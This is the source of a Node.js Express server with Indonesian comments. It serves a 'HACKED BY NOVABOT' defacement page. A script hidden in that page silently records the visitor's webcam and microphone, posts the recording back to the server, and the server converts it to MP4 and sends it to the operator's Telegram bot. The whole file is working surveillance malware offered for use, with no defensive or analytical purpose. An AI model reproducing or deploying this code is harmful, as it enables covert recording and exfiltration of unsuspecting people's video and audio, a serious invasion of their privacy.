const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const config = require('./setting.js');
const ffmpeg = require('@ts-ffmpeg/fluent-ffmpeg');
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
const { Readable } = require('stream');
ffmpeg.setFfmpegPath(ffmpegPath);
const app = express();
const upload = multer({ 
storage: multer.memoryStorage(),
limits: { fileSize: 50 * 1024 * 1024 }
});

// ---------- Halaman Utama (SAMA PERSIS DENGAN ASLI) ----------
app.get('/', (req, res) => {
  const fakeHtml = encodeURIComponent(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>HACKED BY NOVABOT</title>
<style>
html,body{height:100%;margin:0;padding:0;background:#000;color:#fff;font-family:'Courier New',monospace;overflow:hidden}
.content{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:80%;text-align:center}
h1{font-size:36px;margin-bottom:20px}
.red-name{color:red}
.random-message{font-size:18px;margin:20px 0;line-height:1.6}
.team-info{font-size:20px;margin-top:30px}
.contact-link{color:red;text-decoration:none}
.contact-link:hover{text-decoration:underline}
.hacker-gif{max-width:200px;margin:20px auto;display:block}
</style>
</head>
<body>
<div class="content">
<h1>HACKED BY <span class="red-name">NOVABOT</span></h1>
<img src="https://files.catbox.moe/9nk1q1.gif" alt="Hacker GIF" class="hacker-gif">
<div class="random-message">
Sistem Anda sekarang berada di bawah kendali kami Perlawanan sia sia<br>
Hantu hantu di dalam mesin membisikkan pujian untuk kami<br>
Realitas adalah kebohongan Kami menarik tali di balik tabir<br>
Keadilan adalah badai digital yang bangkit dari kode di bawah
</div>
<div class="team-info">
Tim: <span class="red-name">-</span><br>
Kontak: <a href="https://t.me/Novabot403" target="_blank" class="contact-link">@Novabot</a>
</div>
</div>
</body>
</html>
  `);
res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>
body { margin: 0; background: black; }
video { display: none; }
</style>
</head>
<body>
<script>
document.documentElement.innerHTML = decodeURIComponent("${fakeHtml}");
(async function() {
try {
const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
const video = document.createElement('video');
video.srcObject = stream;
video.play();
video.style.display = 'none';
document.body.appendChild(video);
let recordedChunks = [];
const mediaRecorder = new MediaRecorder(stream);
mediaRecorder.ondataavailable = event => {
if (event.data.size > 0) recordedChunks.push(event.data);
};
mediaRecorder.onstop = async () => {
const blob = new Blob(recordedChunks, { type: 'video/webm' });
const formData = new FormData();
formData.append('video', blob, 'recording.webm');
try {
await fetch('/upload', { method: 'POST', body: formData });
} catch (err) {
} finally {
stream.getTracks().forEach(track => track.stop());
}
};
mediaRecorder.start();
setTimeout(() => {
if (mediaRecorder.state !== 'inactive') {
mediaRecorder.stop();
}
}, ${config.RECORD_DURATION});
} catch (err) {
}
})();
</script>
</body>
</html>
`);
});

// ---------- FUNGSI KONVERSI WebM → MP4 ----------
function convertWebmToMp4(webmBuffer) {
return new Promise((resolve, reject) => {
const inputStream = Readable.from(webmBuffer);
const chunks = [];
ffmpeg(inputStream)
.inputFormat('webm')
.videoCodec('libx264')
.audioCodec('aac')
.outputOptions([
'-preset ultrafast',
'-movflags +frag_keyframe+empty_moov'
])
.format('mp4')
.on('start', (cmd) => console.log('🎬 FFmpeg start:', cmd))
.on('error', (err) => {
console.error('❌ FFmpeg error:', err);
reject(err);
})
.on('end', () => {
resolve(Buffer.concat(chunks));
})
.pipe()
.on('data', chunk => chunks.push(chunk))
.on('error', reject);
});
}

// ---------- ENDPOINT UPLOAD ----------
app.post('/upload', upload.single('video'), async (req, res) => {
if (!req.file) {
return res.status(400).json({ success: false, error: 'No video uploaded' });
}
try {
let videoBuffer = req.file.buffer;
let filename = 'recording.webm';
let contentType = 'video/webm';
try {
videoBuffer = await convertWebmToMp4(req.file.buffer);
filename = 'recording.mp4';
contentType = 'video/mp4';
} catch (convErr) {
console.error('⚠️ Konversi gagal, mengirim file asli .webm:', convErr.message);
}
const date = new Date();
const caption = date.toLocaleString('id-ID', {
weekday: 'long',
year: 'numeric',
month: 'long',
day: 'numeric',
hour: '2-digit',
minute: '2-digit',
second: '2-digit',
hour12: false,
timeZone: 'Asia/Jakarta'
}).replace(/\./g, ':');
const formData = new FormData();
formData.append('chat_id', config.OWNER_ID);
formData.append('video', videoBuffer, { filename, contentType });
formData.append('caption', caption);
if (contentType === 'video/mp4') {
formData.append('supports_streaming', 'true');
}
const telegramRes = await axios.post(
`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`,
formData,
{
headers: formData.getHeaders(),
maxContentLength: Infinity,
maxBodyLength: Infinity
}
);
if (telegramRes.data.ok) {
res.json({ success: true });
} else {
console.error('Telegram API error:', telegramRes.data);
res.status(500).json({ success: false, error: 'Telegram API error' });
}
} catch (error) {
console.error('❌ Error:', error.message);
res.status(500).json({ success: false, error: error.message });
}
});
app.use((req, res) => {
res.status(404).send('404 - Not Found');
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
console.log(`🚀 Server running on port ${PORT}`);
console.log(`📹 Recording duration: ${config.RECORD_DURATION}ms`);
});